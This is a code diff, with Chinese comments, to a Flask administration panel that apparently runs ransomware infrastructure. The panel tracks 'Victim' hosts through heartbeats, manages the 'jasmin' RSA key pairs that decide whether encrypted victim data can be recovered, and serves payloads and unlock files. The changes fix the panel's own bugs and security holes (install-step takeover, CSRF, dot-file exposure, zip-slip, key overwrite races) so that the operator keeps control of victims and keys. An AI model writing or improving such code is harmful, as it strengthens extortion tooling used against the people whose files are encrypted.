@@ -206,10 +206,24 @@ def install():
                 db.engine.dispose()
                 with app.app_context():
                     db.create_all()
+                # 与 PHP 侧 install.php 的 $_SESSION['install_db_ok'] 对齐：
+                # 只有「本会话真的完成过第 2 步」才允许第 3 步建号。
+                session['install_db_ok'] = True
                 return redirect(url_for('install', step=3))
             except Exception as e:
                 error = f'数据库连接失败: {e}'
         elif step == 3:
+            # ★ 门禁 + CSRF，两者此前都没有。
+            # PHP 侧 install.php:100 一直有 $_SESSION['install_db_ok'] 校验；
+            # Python 侧缺了它，而第 3 步做的是 DELETE + INSERT 管理员 ——
+            # 也就是说在 installed 还是 False 的窗口期，任何人都能
+            # POST /install?step=3&admin_user=x&admin_pass=... 直接建号或覆盖，
+            # 随后控制整个 Python 面板。install.html 里也从来没有 csrf_token 字段。
+            if not csrf_ok():
+                error = 'CSRF 校验失败，请刷新页面重试'
+            elif not session.get('install_db_ok'):
+                error = '请先完成第 2 步的数据库配置'
+        elif step == 3 and session.get('install_db_ok') and csrf_ok():
             au = request.form.get('admin_user','admin')
             ap_ = request.form.get('admin_pass','')
             ap2 = request.form.get('admin_pass2','')
@@ -226,6 +240,7 @@ def install():
                 cfg = load_config()
                 cfg['installed'] = True
                 json.dump(cfg, open(CONFIG_FILE,'w'))
+                session.pop('install_db_ok', None)   # 用后即焚，防重放
                 return redirect(url_for('install', step=4))
     return render_template('install.html', step=step, error=error,
         env_docker=os.path.exists('/.dockerenv'))
@@ -318,10 +333,16 @@ def change_password():
     db.session.commit()
 
     session.pop(fk, None); session.pop(fkt, None)
-    try:
-        open(os.path.join(os.path.dirname(__file__), '.pw_changed'), 'w').write(datetime.datetime.now().isoformat())
-    except Exception:
-        pass
+    # 写到 payloads/ 共享卷：两个 python 副本与两个 php 副本看到的是同一份，
+    # 而 entrypoint 启动时正是读这个路径来决定要不要重建管理员。
+    # 此前写在 /app/.pw_changed —— 那是镜像层，容器一重建就没了，
+    # 而且没有任何 entrypoint 读它，等于标记白写（口令照样被重置）。
+    for _m in (os.path.join(PAYLOAD_DIR, '.pw_changed'),
+               os.path.join(os.path.dirname(__file__), '.pw_changed')):
+        try:
+            open(_m, 'w').write(datetime.datetime.now().isoformat())
+        except Exception:
+            pass
     return jsonify(ok=True, msg='密码已更新，请使用新密码重新登录')
 
 # ── Dashboard ──
@@ -385,8 +406,15 @@ def handshake():
     et, ed = f.get('encrypted_types', ''), f.get('encrypted_detail', '')
     is_complete = 1 if str(f.get('is_complete', '1')) not in ('0', 'false', 'False') else 0
 
-    # 按 systemid upsert：同一主机多次心跳（进度上报）更新同一行，不产生重复记录
-    v = Victim.query.filter_by(systemid=systemid).first() if systemid else None
+    # 按 systemid upsert：同一主机多次心跳（进度上报）更新同一行，不产生重复记录。
+    # systemid 在表上是 UNIQUE KEY，而空 systemid 会让每次心跳都去新建一行
+    # systemid='' 的记录 —— 第二次就撞唯一键抛 IntegrityError → HTTP 500，
+    # 该主机的心跳从此永久丢失。PHP 侧靠 ON DUPLICATE KEY UPDATE 天然规避，
+    # Python 侧必须自己补一个稳定的兜底 id 才能等价。
+    if not systemid:
+        _seed = f"{f.get('machine_name','')}|{f.get('computer_user','')}|{request.remote_addr}"
+        systemid = 'auto-' + hashlib.sha256(_seed.encode('utf-8')).hexdigest()[:32]
+    v = Victim.query.filter_by(systemid=systemid).first()
     if v is None:
         v = Victim(systemid=systemid)
         db.session.add(v)
@@ -532,7 +560,12 @@ def download_payload(filename):
     它们不需要匿名分发（解密侧取的是 .pem.enc 与 jasmin_unlock.*）。
     """
     base = os.path.basename(filename)
-    if base in ('jasmin_private.pem', '.key_secret') or '.bak.' in base:
+    # 一律拒收点开头的文件。PHP 侧靠 .htaccess 的 <FilesMatch "^\..+$"> 兜住，
+    # 而 Flask 没有等价机制 —— 漏一个就是一个可匿名读到的内部状态文件
+    # （.key_secret / .schema_rl / .pw_changed / .installed ...）。
+    if base.startswith('.'):
+        return 'Forbidden', 403
+    if base in ('jasmin_private.pem',) or '.bak.' in base:
         return 'Forbidden', 403
     path = os.path.join(PAYLOAD_DIR, filename)
     if not os.path.isfile(path):
@@ -610,6 +643,32 @@ def check_update():
 def keygen():
     if not csrf_ok():
         return jsonify(ok=False, msg='CSRF 校验失败，请刷新页面重试'), 403
+
+    # ── 重建保护 + 旧密钥归档 ──
+    # PHP 侧 keygen.php 一直有这两条，Python 侧此前【两条都没有】：
+    # 一次点击直接覆盖 jasmin_private.pem，此前所有受害者数据永久不可解 ——
+    # 而且前端 confirm 挡不住直接调 API。这里与 PHP 行为对齐。
+    _priv_path = os.path.join(PAYLOAD_DIR, 'jasmin_private.pem')
+    _existing = os.path.exists(_priv_path)
+    if _existing and request.form.get('force') != '1':
+        _pub = os.path.join(PAYLOAD_DIR, 'jasmin_public.pem')
+        _kid = ''
+        if os.path.exists(_pub):
+            _kid = hashlib.md5(open(_pub, 'rb').read()).hexdigest()[:8]
+        return jsonify(ok=False, need_confirm=True, key_id=_kid,
+                       msg='已存在密钥对。重新生成会让此前所有已加密数据永久无法解密，请确认后重试。')
+
+    if _existing:
+        _ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
+        for _f in ('jasmin_private.pem', 'jasmin_private.pem.enc',
+                   'jasmin_public.pem', '.key_secret'):
+            _src = os.path.join(PAYLOAD_DIR, _f)
+            if os.path.exists(_src):
+                try:
+                    shutil.copy2(_src, _src + '.bak.' + _ts)
+                except OSError:
+                    pass
+
     from cryptography.hazmat.primitives.asymmetric import rsa as rsa_gen
     from cryptography.hazmat.primitives import serialization as ser
     from cryptography.hazmat.backends import default_backend
@@ -635,10 +694,17 @@ def keygen():
     enc_path = os.path.join(PAYLOAD_DIR, 'jasmin_private.pem.enc')
     pub_path = os.path.join(PAYLOAD_DIR, 'jasmin_public.pem')
     secret_path = os.path.join(PAYLOAD_DIR, '.key_secret')
-    open(priv_path, 'wb').write(priv)
-    open(enc_path, 'w').write(enc_blob)
-    open(pub_path, 'wb').write(pub)
-    open(secret_path, 'w').write(aes_key)
+    # 原子替换：集群里 python 有多个副本且共用一个卷，直接 open(w) 覆盖会
+    # 让并发的两次 keygen 互相穿插，最终落出「公钥来自 A、私钥来自 B」的错配密钥对。
+    def _atomic(path, data, mode='wb'):
+        tmp = path + '.tmp'
+        with open(tmp, mode) as fh:
+            fh.write(data)
+        os.replace(tmp, path)
+    _atomic(priv_path, priv)
+    _atomic(enc_path, enc_blob, 'w')
+    _atomic(pub_path, pub)
+    _atomic(secret_path, aes_key, 'w')
     # 0644: 密钥须可被服务进程读取。直接 URL (payloads/jasmin_private.pem 与
     #       .key_secret) 已被 download_payload 显式 403 拦截，
     #       私钥/口令仅经「需登录」的 /download_key 下发。
@@ -673,6 +739,13 @@ def do_update():
             f.write(resp.read())
         tmpdir = tempfile.mkdtemp()
         with zipfile.ZipFile(tmp, 'r') as zf:
+            # ★ zip-slip：成员名里带 ../ 就能写出 tmpdir 之外（甚至覆盖 app.py 本体）。
+            # 更新源一旦被投毒或被劫持，这条就是把任意文件写到任意路径。
+            _base = os.path.realpath(tmpdir)
+            for _m in zf.namelist():
+                _dst = os.path.realpath(os.path.join(tmpdir, _m))
+                if _dst != _base and not _dst.startswith(_base + os.sep):
+                    return jsonify(ok=False, msg='更新包内含非法路径，已中止')
             zf.extractall(tmpdir)
         os.unlink(tmp)
         # 找到解压后的子目录
@@ -682,9 +755,12 @@ def do_update():
         src = os.path.join(tmpdir, dirs[0], 'Web Panel Python')
         if os.path.isdir(src):
             # 覆盖当前app目录(保留config.json和payloads)
+            # 目标目录按本文件实际所在位置推导，而不是写死 /app ——
+            # 写死会让非 Docker 部署的自更新必然失败。
+            _appdir = os.path.dirname(os.path.abspath(__file__))
             for item in os.listdir(src):
                 s = os.path.join(src, item)
-                d = os.path.join('/app', item)
+                d = os.path.join(_appdir, item)
                 if item in ('config.json', 'payloads'):
                     continue
                 if os.path.isdir(s):
